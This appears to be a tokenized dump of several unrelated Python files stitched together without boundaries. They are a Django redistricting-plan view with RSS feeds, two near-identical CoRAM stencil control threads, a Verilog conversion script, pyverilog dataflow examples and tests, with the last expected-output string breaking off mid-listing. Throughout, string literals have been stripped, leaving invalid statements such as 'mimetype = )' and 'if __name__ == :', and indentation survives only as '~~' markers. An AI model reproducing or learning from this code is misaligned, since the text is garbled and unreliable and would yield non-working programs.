~~ else : \n 
# save this if the label changed \n 
~~~ district . save ( ) \n 
\n 
# Get the tags on this object of this type. \n 
~~ tset = Tag . objects . get_for_object ( district ) . filter ( name__startswith = ) \n 
\n 
# Purge the tags of this same type off the object \n 
TaggedItem . objects . filter ( tag__in = tset , object_id = district . id ) . delete ( ) \n 
\n 
purge_plan_clear_cache ( district , version ) \n 
\n 
if len ( request . REQUEST . getlist ( ) ) > 0 : \n 
~~~ strtags = request . REQUEST . getlist ( ) \n 
for strtag in strtags : \n 
~~~ if strtag == : \n 
~~~ continue \n 
~~ if strtag . count ( ) > 0 : \n 
~~~ strtag = \'"type=%s"\' % strtag \n 
~~ else : \n 
~~~ strtag = % strtag \n 
~~ Tag . objects . add_tag ( district , strtag ) \n 
\n 
~~ ~~ status [ ] = version \n 
status [ ] = True \n 
\n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def plan_feed ( request ) : \n 
~~~ feed = loader . get_template ( ) \n 
\n 
\n 
plans = Plan . objects . all ( ) . order_by ( ) [ 0 : 10 ] \n 
geolevel = plans [ 0 ] . legislative_body . get_geolevels ( ) [ 0 ] \n 
extent = geolevel . geounit_set . collect ( ) . extent \n 
if extent [ 2 ] - extent [ 0 ] > extent [ 3 ] - extent [ 1 ] : \n 
# wider maps \n 
~~~ width = 500 \n 
height = int ( 500 * ( extent [ 3 ] - extent [ 1 ] ) / ( extent [ 2 ] - extent [ 0 ] ) ) \n 
~~ else : \n 
# taller maps \n 
~~~ width = int ( 500 * ( extent [ 2 ] - extent [ 0 ] ) / ( extent [ 3 ] - extent [ 1 ] ) ) \n 
height = 500 \n 
~~ mapserver = settings . MAP_SERVER if settings . MAP_SERVER != else request . META [ ] \n 
context = { \n 
: plans , \n 
: mapserver , \n 
: settings . MAP_SERVER_NS , \n 
: extent , \n 
: width , \n 
: height \n 
} \n 
xml = feed . render ( DjangoContext ( context ) ) \n 
\n 
return HttpResponse ( xml , mimetype = ) \n 
\n 
~~ def share_feed ( request ) : \n 
~~~ feed = loader . get_template ( ) \n 
\n 
\n 
plans = Plan . objects . filter ( is_shared = True ) . order_by ( ) [ 0 : 10 ] \n 
if plans . count ( ) < 0 : \n 
~~~ geolevel = plans [ 0 ] . legislative_body . get_geolevels ( ) [ 0 ] \n 
extent = geolevel . geounit_set . collect ( ) . extent \n 
if extent [ 2 ] - extent [ 0 ] > extent [ 3 ] - extent [ 1 ] : \n 
# wider maps \n 
~~~ width = 500 \n 
height = int ( 500 * ( extent [ 3 ] - extent [ 1 ] ) / ( extent [ 2 ] - extent [ 0 ] ) ) \n 
~~ else : \n 
# taller maps \n 
~~~ width = int ( 500 * ( extent [ 2 ] - extent [ 0 ] ) / ( extent [ 3 ] - extent [ 1 ] ) ) \n 
height = 500 \n 
~~ ~~ else : \n 
~~~ extent = ( 0 , 0 , 0 , 0 , ) \n 
width = 1 \n 
height = 1 \n 
~~ mapserver = settings . MAP_SERVER if settings . MAP_SERVER != else request . META [ ] \n 
context = { \n 
: plans , \n 
: mapserver , \n 
: settings . MAP_SERVER_NS , \n 
: extent , \n 
: width , \n 
: height \n 
} \n 
xml = feed . render ( DjangoContext ( context ) ) \n 
\n 
return HttpResponse ( xml , mimetype = ) \n 
#------------------------------------------------------------------------------- \n 
# 330_stencil \n 
# Processor Design Contest \n 
#------------------------------------------------------------------------------- \n 
#------------------------------------------------------------------------------- \n 
# Parameters \n 
#------------------------------------------------------------------------------- \n 
# Mesh size n = i * 16 (where i = 1, 2, 3, ...) \n 
# Max Mesh Size = 4096 (i = 256) \n 
# Actual Max Mesh Size = 512 (according to the reference program) \n 
\n 
~~ DSIZE = 4 \n 
SIZE = 512 # word \n 
\n 
# default value \n 
a_offset = 1 * 1024 * 1024 \n 
b_offset = 2 * 1024 * 1024 \n 
\n 
#------------------------------------------------------------------------------- \n 
# IO channel \n 
#------------------------------------------------------------------------------- \n 
iochannel = CoramIoChannel ( idx = 0 , datawidth = 32 ) \n 
\n 
#------------------------------------------------------------------------------- \n 
# Computation \n 
#------------------------------------------------------------------------------- \n 
mem0 = CoramMemory ( idx = 0 , datawidth = 8 * DSIZE , size = SIZE ) # source 0 \n 
mem1 = CoramMemory ( idx = 1 , datawidth = 8 * DSIZE , size = SIZE ) # source 1 \n 
mem2 = CoramMemory ( idx = 2 , datawidth = 8 * DSIZE , size = SIZE ) # source 2 \n 
mem3 = CoramMemory ( idx = 3 , datawidth = 8 * DSIZE , size = SIZE ) # source 3 \n 
mem_d0 = CoramMemory ( idx = 4 , datawidth = 8 * DSIZE , size = SIZE ) # destination 0 \n 
mem_d1 = CoramMemory ( idx = 5 , datawidth = 8 * DSIZE , size = SIZE ) # destination 1 \n 
channel = CoramChannel ( idx = 0 , datawidth = 8 * DSIZE ) \n 
\n 
#------------------------------------------------------------------------------- \n 
def st_set_mesh_size ( mesh_size ) : \n 
~~~ channel . write ( mesh_size ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_step ( mesh_size , read_start , write_start ) : \n 
~~~ read_page = 3 \n 
write_page = 0 \n 
\n 
read_addr = read_start \n 
\n 
mem0 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem1 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem2 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
write_addr = write_start + mesh_size * DSIZE + DSIZE \n 
\n 
for i in range ( mesh_size - 2 ) : \n 
~~~ hot_spot = 1 if i == 0 else 0 \n 
pos = ( ( hot_spot << 6 ) | \n 
( ( 0x1 << write_page ) << 4 ) | \n 
( 0x1 << read_page ) ) \n 
\n 
mem0 . wait ( ) \n 
mem1 . wait ( ) \n 
mem2 . wait ( ) \n 
mem3 . wait ( ) \n 
\n 
channel . write ( pos ) \n 
\n 
if read_page == 0 : \n 
~~~ mem0 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 1 : \n 
~~~ mem1 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 2 : \n 
~~~ mem2 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 3 : \n 
~~~ mem3 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
\n 
~~ read_page = 0 if read_page == 3 else read_page + 1 \n 
read_addr += mesh_size * DSIZE \n 
\n 
channel . read ( ) \n 
\n 
mem_d0 . wait ( ) \n 
mem_d1 . wait ( ) \n 
\n 
if write_page == 0 : \n 
~~~ mem_d0 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
~~ elif write_page == 1 : \n 
~~~ mem_d1 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
\n 
~~ write_addr += mesh_size * DSIZE \n 
write_page = 0 if write_page == 1 else write_page + 1 \n 
\n 
~~ mem_d0 . wait ( ) \n 
mem_d1 . wait ( ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_computation ( num_iter , mesh_size ) : \n 
~~~ for i in range ( num_iter / 2 ) : \n 
~~~ st_step ( mesh_size , a_offset , b_offset ) \n 
st_step ( mesh_size , b_offset , a_offset ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_sum ( mesh_size ) : \n 
~~~ check_sum = 0 \n 
read_addr = a_offset \n 
for i in range ( mesh_size ) : \n 
~~~ mem0 . write ( 0 , read_addr , mesh_size ) \n 
init_sum = 1 if i == 0 else 0 \n 
calc_sum = 1 \n 
pos = ( init_sum << 8 ) | ( calc_sum << 7 ) \n 
channel . write ( pos ) \n 
read_addr += mesh_size * DSIZE \n 
check_sum = channel . read ( ) \n 
~~ channel . write ( 0 ) # reset main pipeline \n 
return check_sum \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_main ( ) : \n 
~~~ global a_offset \n 
global b_offset \n 
\n 
mesh_size = iochannel . read ( ) \n 
print ( "thread: mesh_size=%d" % mesh_size ) \n 
num_iter = iochannel . read ( ) \n 
print ( "thread: num_iter=%d" % num_iter ) \n 
a_offset = iochannel . read ( ) \n 
print ( "thread: a_offset=%d" % a_offset ) \n 
b_offset = iochannel . read ( ) \n 
print ( "thread: b_offset=%d" % b_offset ) \n 
\n 
print ( "thread: st_set_mesh_size" ) \n 
st_set_mesh_size ( mesh_size ) \n 
\n 
print ( "thread: st_computation" ) \n 
st_computation ( num_iter , mesh_size ) \n 
\n 
print ( "thread: st_sum" ) \n 
check_sum = st_sum ( mesh_size ) \n 
\n 
iochannel . write ( check_sum ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ while True : \n 
~~~ st_main ( ) \n 
#------------------------------------------------------------------------------- \n 
# 330_stencil \n 
# Processor Design Contest \n 
#------------------------------------------------------------------------------- \n 
#------------------------------------------------------------------------------- \n 
# Parameters \n 
#------------------------------------------------------------------------------- \n 
# Mesh size n = i * 16 (where i = 1, 2, 3, ...) \n 
# Max Mesh Size = 4096 (i = 256) \n 
# Actual Max Mesh Size = 512 (according to the reference program) \n 
\n 
~~ DSIZE = 4 \n 
SIZE = 512 # word \n 
\n 
# default value \n 
a_offset = 1 * 1024 * 1024 \n 
b_offset = 2 * 1024 * 1024 \n 
\n 
#------------------------------------------------------------------------------- \n 
# IO channel \n 
#------------------------------------------------------------------------------- \n 
iochannel = CoramIoChannel ( idx = 0 , datawidth = 32 ) \n 
\n 
#------------------------------------------------------------------------------- \n 
# Computation \n 
#------------------------------------------------------------------------------- \n 
mem0 = CoramMemory ( idx = 0 , datawidth = 8 * DSIZE , size = SIZE ) # source 0 \n 
mem1 = CoramMemory ( idx = 1 , datawidth = 8 * DSIZE , size = SIZE ) # source 1 \n 
mem2 = CoramMemory ( idx = 2 , datawidth = 8 * DSIZE , size = SIZE ) # source 2 \n 
mem_d0 = CoramMemory ( idx = 4 , datawidth = 8 * DSIZE , size = SIZE ) # destination 0 \n 
channel = CoramChannel ( idx = 0 , datawidth = 8 * DSIZE ) \n 
\n 
#------------------------------------------------------------------------------- \n 
def st_set_mesh_size ( mesh_size ) : \n 
~~~ channel . write ( mesh_size ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_step ( mesh_size , read_start , write_start ) : \n 
~~~ read_page = 0 \n 
read_addr = read_start \n 
\n 
mem0 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem1 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem2 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
write_addr = write_start + mesh_size * DSIZE + DSIZE \n 
\n 
for i in range ( mesh_size - 2 ) : \n 
~~~ hot_spot = 1 if i == 0 else 0 \n 
pos = hot_spot \n 
\n 
mem0 . wait ( ) \n 
mem1 . wait ( ) \n 
mem2 . wait ( ) \n 
\n 
channel . write ( pos ) \n 
channel . read ( ) \n 
\n 
if read_page == 0 : \n 
~~~ mem0 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 1 : \n 
~~~ mem1 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 2 : \n 
~~~ mem2 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
\n 
~~ read_page = 0 if read_page == 2 else read_page + 1 \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem_d0 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
write_addr += mesh_size * DSIZE \n 
mem_d0 . wait ( ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_computation ( num_iter , mesh_size ) : \n 
~~~ for i in range ( num_iter / 2 ) : \n 
~~~ st_step ( mesh_size , a_offset , b_offset ) \n 
st_step ( mesh_size , b_offset , a_offset ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_sum ( mesh_size ) : \n 
~~~ check_sum = 0 \n 
read_addr = a_offset \n 
for i in range ( mesh_size ) : \n 
~~~ mem0 . write ( 0 , read_addr , mesh_size ) \n 
init_sum = 1 if i == 0 else 0 \n 
calc_sum = 1 \n 
pos = ( init_sum << 2 ) | ( calc_sum << 1 ) \n 
channel . write ( pos ) \n 
read_addr += mesh_size * DSIZE \n 
check_sum = channel . read ( ) \n 
~~ channel . write ( 0xff ) # reset main pipeline \n 
return check_sum \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_main ( ) : \n 
~~~ global a_offset \n 
global b_offset \n 
\n 
mesh_size = iochannel . read ( ) \n 
print ( "thread: mesh_size=%d" % mesh_size ) \n 
num_iter = iochannel . read ( ) \n 
print ( "thread: num_iter=%d" % num_iter ) \n 
a_offset = iochannel . read ( ) \n 
print ( "thread: a_offset=%d" % a_offset ) \n 
b_offset = iochannel . read ( ) \n 
print ( "thread: b_offset=%d" % b_offset ) \n 
\n 
print ( "thread: st_set_mesh_size" ) \n 
st_set_mesh_size ( mesh_size ) \n 
\n 
print ( "thread: st_computation" ) \n 
st_computation ( num_iter , mesh_size ) \n 
\n 
print ( "thread: st_sum" ) \n 
check_sum = st_sum ( mesh_size ) \n 
\n 
iochannel . write ( check_sum ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ while True : \n 
~~~ st_main ( ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import re \n 
import sys \n 
import os \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getRamName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
def getRamId ( oid , sid ) : \n 
~~~ if 0 <= sid and sid <= 31 : \n 
~~~ return 0 \n 
~~ if 32 <= sid and sid <= 63 : \n 
~~~ return 1 \n 
~~ if 64 <= sid and sid <= 95 : \n 
~~~ return 2 \n 
~~ if 96 <= sid and sid <= 127 : \n 
~~~ return 3 \n 
\n 
~~ ~~ def getRamSubId ( oid , sid ) : \n 
~~~ if 0 <= sid and sid <= 31 : \n 
~~~ return sid \n 
~~ if 32 <= sid and sid <= 63 : \n 
~~~ return sid - 32 \n 
~~ if 64 <= sid and sid <= 95 : \n 
~~~ return sid - 64 \n 
~~ if 96 <= sid and sid <= 127 : \n 
~~~ return sid - 96 \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getChannelName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def getChannelId ( oid , sid ) : \n 
~~~ return oid \n 
\n 
~~ def getChannelSubId ( oid , sid ) : \n 
~~~ return sid \n 
\n 
#------------------------------------------------------------------------------- \n 
# EDIT! getRegisterName is a conversion rule of SUB_ID  \n 
#------------------------------------------------------------------------------- \n 
~~ def getRegisterId ( oid , sid ) : \n 
~~~ return oid \n 
\n 
~~ def getRegisterSubId ( oid , sid ) : \n 
~~~ return sid \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def main ( ) : \n 
~~~ f = open ( sys . argv [ 1 ] , ) \n 
lines = f . readlines ( ) \n 
output = [ ] \n 
\n 
p_thread = re . compile ( ) \n 
p_thread_id = re . compile ( ) \n 
p_object_id = re . compile ( ) \n 
p_width = re . compile ( ) \n 
p_depth = re . compile ( ) \n 
p_indexwidth = re . compile ( ) \n 
p_logdepth = re . compile ( ) \n 
p_sub_id = re . compile ( ) \n 
\n 
module_name = None \n 
thread_name = None \n 
thread_id = None \n 
object_id = None \n 
sub_id = None \n 
width = None \n 
indexwidth = None \n 
depth = None \n 
\n 
mode = False \n 
\n 
sub_id_num = None \n 
sub_id_base = None \n 
\n 
buffer = [ ] \n 
\n 
print ( "`include \\"coram2pycoram.v\\"" ) \n 
\n 
for line in lines : \n 
~~~ if not mode : \n 
~~~ m = p_thread . match ( line ) \n 
if m : \n 
~~~ thread_name = re . match ( \'.*(".*").*\' , m . group ( 2 ) ) . group ( 1 ) \n 
module_name = re . search ( , line ) . group ( 1 ) \n 
mode = True \n 
buffer = [ ] \n 
buffer . append ( line ) \n 
continue \n 
~~ ~~ else : \n 
~~~ m = p_thread_id . match ( line ) \n 
if m : \n 
~~~ tid_str = m . group ( 2 ) [ 1 : - 1 ] \n 
thread_id = re . match ( , tid_str ) . group ( 2 ) \n 
#tid_str = m.group(2) \n 
\n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_object_id . match ( line ) \n 
if m : \n 
~~~ oid_str = m . group ( 2 ) [ 1 : - 1 ] \n 
object_id = re . match ( , oid_str ) . group ( 2 ) \n 
#oid_str = m.group(2) \n 
\n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_width . match ( line ) \n 
if m : \n 
#width_str = m.group(2)[1:-1] \n 
\n 
~~~ width_str = m . group ( 2 ) \n 
width = re . match ( , width_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_depth . match ( line ) \n 
if m : \n 
#depth_str = m.group(2)[1:-1] \n 
\n 
~~~ depth_str = m . group ( 2 ) \n 
depth = re . match ( , depth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_indexwidth . match ( line ) \n 
if m : \n 
#indexwidth_str = m.group(2)[1:-1] \n 
\n 
~~~ indexwidth_str = m . group ( 2 ) \n 
indexwidth = re . match ( , indexwidth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_logdepth . match ( line ) \n 
if m : \n 
#logdepth_str = m.group(2)[1:-1] \n 
\n 
~~~ logdepth_str = m . group ( 2 ) \n 
logdepth = re . match ( , logdepth_str ) . group ( 1 ) \n 
buffer . append ( line ) \n 
continue \n 
~~ m = p_sub_id . match ( line ) \n 
if m : \n 
#sid_str = m.group(2)[1:-1] \n 
\n 
#sid_str = m.group(2) \n 
\n 
~~~ sid_str = m . group ( 2 ) \n 
\n 
sub_id_m = re . search ( , sid_str ) \n 
sub_id = sub_id_m . group ( 0 ) \n 
sub_id_num = sub_id_m . group ( 2 ) \n 
sub_id_base = ( 10 if sub_id_m . group ( 1 ) . count ( "\'d" ) > 0 else \n 
16 if sub_id_m . group ( 1 ) . count ( "\'h" ) > 0 else \n 
2 if sub_id_m . group ( 1 ) . count ( "\'b" ) > 0 else \n 
10 ) \n 
buffer . append ( line ) \n 
continue \n 
\n 
~~ ~~ if mode : \n 
~~~ print ( "PY%s #(" % module_name ) \n 
\n 
print ( "/*CORAM_THREAD_NAME*/ %s," % . join ( ( thread_name [ : - 1 ] , , thread_id , \'"\' ) ) ) \n 
print ( "/*CORAM_THREAD_ID*/ %s," % thread_id ) \n 
\n 
if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getRamId ( int ( object_id ) , int ( sub_id_num , sub_id_base ) ) ) \n 
~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getChannelId ( int ( object_id ) , int ( sub_id_num , sub_id_base ) ~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_ID*/ %d," % getRegisterId ( int ( object_id ) , int ( sub_id_num , sub_id_base \n 
~~ if module_name . count ( ) > 0 : \n 
~~~ print ( "/*CORAM_SUB_ID*/ %s," % getRamSubId ( int ( object_id ) , int ( sub_id_num , sub_id_base ~~ if module_name . count ( ) > 0 : \n 
#print("/*CORAM_SUB_ID*/ %s," % getChannelSubId(int(object_id), int(sub_id_num, sub_id_base))) ~~~ print ( "/*CORAM_SUB_ID*/ %s," % ) \n 
~~ if module_name . count ( ) > 0 : \n 
#print("/*CORAM_SUB_ID*/ %s," % getRegisterSubId(int(object_id), int(sub_id_num, sub_id_base))) ~~~ print ( "/*CORAM_SUB_ID*/ %s," % ) \n 
\n 
~~ print ( "/*CORAM_ADDR_LEN*/ %s," % indexwidth ) \n 
print ( "/*CORAM_DATA_WIDTH*/ %s," % width ) \n 
print ( "/*THREAD*/ %s," % thread_name ) \n 
print ( . join ( buffer [ 1 : ] ) ) \n 
\n 
~~ mode = False \n 
print ( line , end = ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ main ( ) \n 
from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
from optparse import OptionParser \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) \n 
\n 
import pyverilog . utils . version \n 
from pyverilog . dataflow . dataflow_analyzer import VerilogDataflowAnalyzer \n 
\n 
def main ( ) : \n 
~~~ INFO = "Verilog module signal/module dataflow analyzer" \n 
VERSION = pyverilog . utils . version . VERSION \n 
USAGE = "Usage: python example_dataflow_analyzer.py -t TOPMODULE file ..." \n 
\n 
def showVersion ( ) : \n 
~~~ print ( INFO ) \n 
print ( VERSION ) \n 
print ( USAGE ) \n 
sys . exit ( ) \n 
\n 
~~ optparser = OptionParser ( ) \n 
optparser . add_option ( "-v" , "--version" , action = "store_true" , dest = "showversion" , \n 
default = False , help = "Show the version" ) \n 
optparser . add_option ( "-I" , "--include" , dest = "include" , action = "append" , \n 
default = [ ] , help = "Include path" ) \n 
optparser . add_option ( "-D" , dest = "define" , action = "append" , \n 
default = [ ] , help = "Macro Definition" ) \n 
optparser . add_option ( "-t" , "--top" , dest = "topmodule" , \n 
default = "TOP" , help = "Top module, Default=TOP" ) \n 
optparser . add_option ( "--nobind" , action = "store_true" , dest = "nobind" , \n 
default = False , help = "No binding traversal, Default=False" ) \n 
optparser . add_option ( "--noreorder" , action = "store_true" , dest = "noreorder" , \n 
default = False , help = "No reordering of binding dataflow, Default=False" ) \n 
( options , args ) = optparser . parse_args ( ) \n 
\n 
filelist = args \n 
if options . showversion : \n 
~~~ showVersion ( ) \n 
\n 
~~ for f in filelist : \n 
~~~ if not os . path . exists ( f ) : raise IOError ( "file not found: " + f ) \n 
\n 
~~ if len ( filelist ) == 0 : \n 
~~~ showVersion ( ) \n 
\n 
~~ analyzer = VerilogDataflowAnalyzer ( filelist , options . topmodule , \n 
noreorder = options . noreorder , \n 
nobind = options . nobind , \n 
preprocess_include = options . include , \n 
preprocess_define = options . define ) \n 
analyzer . generate ( ) \n 
\n 
directives = analyzer . get_directives ( ) \n 
print ( ) \n 
for dr in sorted ( directives , key = lambda x : str ( x ) ) : \n 
~~~ print ( dr ) \n 
\n 
~~ instances = analyzer . getInstances ( ) \n 
print ( ) \n 
for module , instname in sorted ( instances , key = lambda x : str ( x [ 1 ] ) ) : \n 
~~~ print ( ( module , instname ) ) \n 
\n 
~~ if options . nobind : \n 
~~~ print ( ) \n 
signals = analyzer . getSignals ( ) \n 
for sig in signals : \n 
~~~ print ( sig ) \n 
\n 
~~ print ( ) \n 
consts = analyzer . getConsts ( ) \n 
for con in consts : \n 
~~~ print ( con ) \n 
\n 
~~ ~~ else : \n 
~~~ terms = analyzer . getTerms ( ) \n 
print ( ) \n 
for tk , tv in sorted ( terms . items ( ) , key = lambda x : str ( x [ 0 ] ) ) : \n 
~~~ print ( tv . tostr ( ) ) \n 
\n 
~~ binddict = analyzer . getBinddict ( ) \n 
print ( ) \n 
for bk , bv in sorted ( binddict . items ( ) , key = lambda x : str ( x [ 0 ] ) ) : \n 
~~~ for bvi in bv : \n 
~~~ print ( bvi . tostr ( ) ) \n 
\n 
~~ ~~ ~~ ~~ if __name__ == : \n 
~~~ main ( ) \n 
#------------------------------------------------------------------------------- \n 
# replace.py \n 
#  \n 
# Replacing DFUndefined and None with DFTerminal \n 
# \n 
# Copyright (C) 2013, Shinya Takamaeda-Yamazaki \n 
# License: Apache 2.0 \n 
#------------------------------------------------------------------------------- \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
from pyverilog . dataflow . dataflow import * \n 
\n 
def replaceUndefined ( tree , termname ) : \n 
~~~ if tree is None : return DFTerminal ( termname ) \n 
if isinstance ( tree , DFUndefined ) : return DFTerminal ( termname ) \n 
#if isinstance(tree, DFHighImpedance): return DFTerminal(termname) \n 
if isinstance ( tree , DFConstant ) : return tree \n 
if isinstance ( tree , DFEvalValue ) : return tree \n 
if isinstance ( tree , DFTerminal ) : return tree \n 
if isinstance ( tree , DFBranch ) : \n 
~~~ condnode = replaceUndefined ( tree . condnode , termname ) \n 
truenode = replaceUndefined ( tree . truenode , termname ) \n 
falsenode = replaceUndefined ( tree . falsenode , termname ) \n 
return DFBranch ( condnode , truenode , falsenode ) \n 
~~ if isinstance ( tree , DFOperator ) : \n 
~~~ nextnodes = [ ] \n 
for n in tree . nextnodes : \n 
~~~ nextnodes . append ( replaceUndefined ( n , termname ) ) \n 
~~ return DFOperator ( tuple ( nextnodes ) , tree . operator ) \n 
~~ if isinstance ( tree , DFPartselect ) : \n 
~~~ msb = replaceUndefined ( tree . msb , termname ) \n 
lsb = replaceUndefined ( tree . lsb , termname ) \n 
var = replaceUndefined ( tree . var , termname ) \n 
return DFPartselect ( var , msb , lsb ) \n 
~~ if isinstance ( tree , DFPointer ) : \n 
~~~ ptr = replaceUndefined ( tree . ptr , termname ) \n 
var = replaceUndefined ( tree . var , termname ) \n 
return DFPointer ( var , ptr ) \n 
~~ if isinstance ( tree , DFConcat ) : \n 
~~~ nextnodes = [ ] \n 
for n in tree . nextnodes : \n 
~~~ nextnodes . append ( replaceUndefined ( n , termname ) ) \n 
~~ return DFConcat ( tuple ( nextnodes ) ) \n 
~~ raise DefinitionError ( % ( str ( type ( tree ) ) , str ( tree ) ) ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import os \n 
import sys \n 
from pyverilog . dataflow . dataflow_analyzer import VerilogDataflowAnalyzer \n 
from pyverilog . dataflow . optimizer import VerilogDataflowOptimizer \n 
from pyverilog . controlflow . controlflow_analyzer import VerilogControlflowAnalyzer \n 
\n 
codedir = os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) + \n 
expected = """\\\nTOP.IN1: TOP_IN1\nTOP.SEL: TOP_SEL\nTOP.bit: (((TOP_SEL==\'d0))? TOP_IN1 : 1\'d0)\nTOP.md_always0.al_block0.al_functioncall0._rn0_func1: TOP_IN1\nTOP.md_always0.al_block0.al_functioncall0._rn1_func1: 1\'d0\nTOP.md_always0.al_block0.al_functioncall0.func1: (((TOP_SEL==\'d0))? TOP_IN1 : 1\'d0)\nTOP.md_always0.al_block0.al_functioncall0.in1: TOP_IN1\nTOP.md_always0.al_block0.al_functioncall0.sel: TOP_SEL\n""" \n 
\n 
def test ( ) : \n 
~~~ filelist = [ codedir + ] \n 
topmodule = \n 
noreorder = False \n 
nobind = False \n 
include = None \n 
define = None \n 
\n 
analyzer = VerilogDataflowAnalyzer ( filelist , topmodule , \n 
noreorder = noreorder , \n 
nobind = nobind , \n 
preprocess_include = include , \n 
preprocess_define = define ) \n 
analyzer . generate ( ) \n 
\n 
directives = analyzer . get_directives ( ) \n 
instances = analyzer . getInstances ( ) \n 
terms = analyzer . getTerms ( ) \n 
binddict = analyzer . getBinddict ( ) \n 
\n 
optimizer = VerilogDataflowOptimizer ( terms , binddict ) \n 
optimizer . resolveConstant ( ) \n 
\n 
c_analyzer = VerilogControlflowAnalyzer ( topmodule , terms , \n 
binddict , \n 
resolved_terms = optimizer . getResolvedTerms ( ) , \n 
resolved_binddict = optimizer . getResolvedBinddict ( ) , \n 
constlist = optimizer . getConstlist ( ) \n 
) \n 
\n 
output = [ ] \n 
for tk in sorted ( c_analyzer . resolved_terms . keys ( ) , key = lambda x : str ( x ) ) : \n 
~~~ tree = c_analyzer . makeTree ( tk ) \n 
output . append ( str ( tk ) + + tree . tocode ( ) ) \n 
\n 
~~ rslt = . join ( output ) + \n 
\n 
print ( rslt ) \n 
\n 
assert ( expected == rslt ) \n 
\n 
~~ if __name__ == : \n 
~~~ test ( ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import dataflow_example \n 
\n 
expected_verilog = """\nmodule test;\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] xdata;\n  reg xvalid;\n  wire xready;\n  reg [32-1:0] ydata;\n  reg yvalid;\n  wire yready;\n  wire [32-1:0] zdata;\n  wire zvalid;\n  reg zready;\n\n  main\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .xdata(xdata),\n    .xvalid(xvalid),\n    .xready(xready),\n    .ydata(ydata),\n    .yvalid(yvalid),\n    .yready(yready),\n    .zdata(zdata),\n    .zvalid(zvalid),\n    .zready(zready)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    xdata = 0;\n    xvalid = 0;\n    ydata = 0;\n    yvalid = 0;\n    zready = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  reg [32-1:0] _tmp_0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n  localparam xfsm_3 = 3;\n  localparam xfsm_4 = 4;\n  localparam xfsm_5 = 5;\n  localparam xfsm_6 = 6;\n  localparam xfsm_7 = 7;\n  localparam xfsm_8 = 8;\n  localparam xfsm_9 = 9;\n  localparam xfsm_10 = 10;\n  localparam xfsm_11 = 11;\n  localparam xfsm_12 = 12;\n  localparam xfsm_13 = 13;\n  localparam xfsm_14 = 14;\n  localparam xfsm_15 = 15;\n  localparam xfsm_16 = 16;\n  localparam xfsm_17 = 17;\n  localparam xfsm_18 = 18;\n  localparam xfsm_19 = 19;\n  localparam xfsm_20 = 20;\n  localparam xfsm_21 = 21;\n  localparam 